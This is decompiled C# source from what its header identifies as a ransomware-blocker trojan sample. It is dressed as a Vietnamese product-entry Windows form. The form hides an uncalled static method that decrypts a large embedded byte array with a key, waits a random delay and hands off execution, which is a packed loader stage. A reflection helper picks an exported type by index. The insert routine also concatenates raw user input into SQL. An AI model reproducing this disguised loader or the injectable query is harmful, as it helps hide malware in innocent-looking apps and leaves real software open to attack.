// Decompiled with JetBrains decompiler
// Type: n5C.Ye6
// Assembly: a7A, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 35A00F83-339C-407C-8770-B1A09BF1E0B3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.04-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-375b5d8e986b228149dbe2f4cd9df92e697491052531a094fb7172ad0d25bd82.exe

using Microsoft.VisualBasic.CompilerServices;
using Rn4;
using s5W;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Ww0;
using Xb1;

namespace n5C
{
  [DesignerGenerated]
  public class Ye6 : Form
  {
    private IContainer components;
    private y2D dataaccess;

    public Ye6()
    {
      this.Load += new EventHandler(this.Hw3);
      this.dataaccess = new y2D();
      this.a4G();
    }

    [DebuggerNonUserCode]
    protected virtual void p1A(bool Xy3)
    {
      try
      {
        if (!Xy3 || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        this.Dispose(Xy3);
      }
    }

    [DebuggerStepThrough]
    private void a4G()
    {
      this.lablbla = new Label();
      this.labbale = new Label();
      this.Label3 = new Label();
      this.txtLoaisp = new TextBox();
      this.txtMasp = new TextBox();
      this.txtTensp = new TextBox();
      this.Label4 = new Label();
      this.txtSoluong = new TextBox();
      this.btnOK = new Button();
      this.btnCanc = new Button();
      this.SuspendLayout();
      this.lablbla.AutoSize = true;
      this.lablbla.Location = new Point(13, 26);
      this.lablbla.Name = "lablbla";
      this.lablbla.Size = new Size(44, 13);
      this.lablbla.TabIndex = 0;
      this.lablbla.Text = "Loai SP";
      this.labbale.AutoSize = true;
      this.labbale.Location = new Point(13, 71);
      this.labbale.Name = "labbale";
      this.labbale.Size = new Size(39, 13);
      this.labbale.TabIndex = 1;
      this.labbale.Text = "Ma SP";
      this.Label3.AutoSize = true;
      this.Label3.Location = new Point(13, 119);
      this.Label3.Name = "Label3";
      this.Label3.Size = new Size(43, 13);
      this.Label3.TabIndex = 2;
      this.Label3.Text = "Ten SP";
      this.txtLoaisp.Location = new Point(72, 23);
      this.txtLoaisp.Name = "txtLoaisp";
      this.txtLoaisp.ReadOnly = true;
      this.txtLoaisp.Size = new Size(179, 20);
      this.txtLoaisp.TabIndex = 3;
      this.txtMasp.Location = new Point(72, 68);
      this.txtMasp.Name = "txtMasp";
      this.txtMasp.Size = new Size(179, 20);
      this.txtMasp.TabIndex = 4;
      this.txtTensp.Location = new Point(72, 116);
      this.txtTensp.Name = "txtTensp";
      this.txtTensp.Size = new Size(179, 20);
      this.txtTensp.TabIndex = 5;
      this.Label4.AutoSize = true;
      this.Label4.Location = new Point(13, 168);
      this.Label4.Name = "Label4";
      this.Label4.Size = new Size(53, 13);
      this.Label4.TabIndex = 6;
      this.Label4.Text = "So Luong";
      this.txtSoluong.Location = new Point(72, 168);
      this.txtSoluong.Name = "txtSoluong";
      this.txtSoluong.Size = new Size(179, 20);
      this.txtSoluong.TabIndex = 7;
      this.btnOK.Location = new Point(48, 207);
      this.btnOK.Name = "btnOK";
      this.btnOK.Size = new Size(75, 23);
      this.btnOK.TabIndex = 8;
      this.btnOK.Text = "OK";
      this.btnOK.UseVisualStyleBackColor = true;
      this.btnCanc.Location = new Point(160, 207);
      this.btnCanc.Name = "btnCanc";
      this.btnCanc.Size = new Size(75, 23);
      this.btnCanc.TabIndex = 9;
      this.btnCanc.Text = "Cancel";
      this.btnCanc.UseVisualStyleBackColor = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(284, 262);
      this.Controls.Add((Control) this.btnCanc);
      this.Controls.Add((Control) this.btnOK);
      this.Controls.Add((Control) this.txtSoluong);
      this.Controls.Add((Control) this.Label4);
      this.Controls.Add((Control) this.txtTensp);
      this.Controls.Add((Control) this.txtMasp);
      this.Controls.Add((Control) this.txtLoaisp);
      this.Controls.Add((Control) this.Label3);
      this.Controls.Add((Control) this.labbale);
      this.Controls.Add((Control) this.lablbla);
      this.Name = "AddSp";
      this.Text = "AddSp";
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    [field: AccessedThroughProperty("lablbla")]
    internal virtual Label lablbla { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("labbale")]
    internal virtual Label labbale { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label3")]
    internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("txtLoaisp")]
    internal virtual TextBox txtLoaisp { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("txtMasp")]
    internal virtual TextBox txtMasp { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("txtTensp")]
    internal virtual TextBox txtTensp { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label4")]
    internal virtual Label Label4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("txtSoluong")]
    internal virtual TextBox txtSoluong { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button btnOK
    {
      get => this._btnOK;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Gz7);
        Button btnOk1 = this._btnOK;
        if (btnOk1 != null)
          btnOk1.Click -= eventHandler;
        this._btnOK = value;
        Button btnOk2 = this._btnOK;
        if (btnOk2 == null)
          return;
        btnOk2.Click += eventHandler;
      }
    }

    internal virtual Button btnCanc
    {
      get => this._btnCanc;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.z3B);
        Button btnCanc1 = this._btnCanc;
        if (btnCanc1 != null)
          btnCanc1.Click -= eventHandler;
        this._btnCanc = value;
        Button btnCanc2 = this._btnCanc;
        if (btnCanc2 == null)
          return;
        btnCanc2.Click += eventHandler;
      }
    }

    private object Gz8() => (object) this.dataaccess.r3Q("INSERT INTO SanPham (MaSP,TenSP,SL,MaLSP)" + string.Format("VALUES ('{0}','{1}','{2}','{3}')", (object) this.txtMasp.Text, (object) this.txtTensp.Text, (object) this.txtSoluong.Text, (object) this.txtLoaisp.Text));

    private object Lc9() => (object) (bool) (string.IsNullOrEmpty(this.txtMasp.Text) || string.IsNullOrEmpty(this.txtTensp.Text) || string.IsNullOrEmpty(this.txtSoluong.Text) ? 1 : (string.IsNullOrEmpty(this.txtLoaisp.Text) ? 1 : 0));

    private void Hw3(object y4H, EventArgs Xc5)
    {
    }

    internal static void Bx3()
    {
      byte[] numArray = Xq1.Hx2(133632);
      int x4Z = checked (Convert.ToInt32(RuntimeHelpers.GetObjectValue(Kb1.mDic[Kb1.sNum])) * 3);
      int num = checked (numArray.Length - 1);
      int Ce2 = 0;
      while (Ce2 <= num)
      {
        numArray[Ce2] = Kq4.Dk4(numArray[Ce2], (byte[]) Kb1.mDic[Kb1.sArray], x4Z, Ce2);
        checked { ++Ce2; }
      }
      Kb1.mDic.Add(Kb1.mArray, (object) numArray);
      Task.Delay(new Random().Next(1000, 5000)).Wait();
      y2D.Fe7();
    }

    private void Gz7(object o2W, EventArgs q0Y)
    {
      if (Conversions.ToBoolean(this.Lc9()))
      {
        int num1 = (int) MessageBox.Show("Chua nhap gia tri", "Error", MessageBoxButtons.OK);
      }
      else
      {
        if (Conversions.ToBoolean(this.Gz8()))
        {
          int num2 = (int) MessageBox.Show("Them thanh cong", "Success", MessageBoxButtons.OK);
          this.DialogResult = DialogResult.OK;
        }
        else
        {
          int num3 = (int) MessageBox.Show("Them that bai", "Error", MessageBoxButtons.OK);
          this.DialogResult = DialogResult.No;
        }
        this.Close();
      }
    }

    internal static System.Type Sk5(Assembly Cr8) => Cr8.GetExportedTypes()[27];

    private void z3B(object Dp8, EventArgs g9S) => this.Close();
  }
}
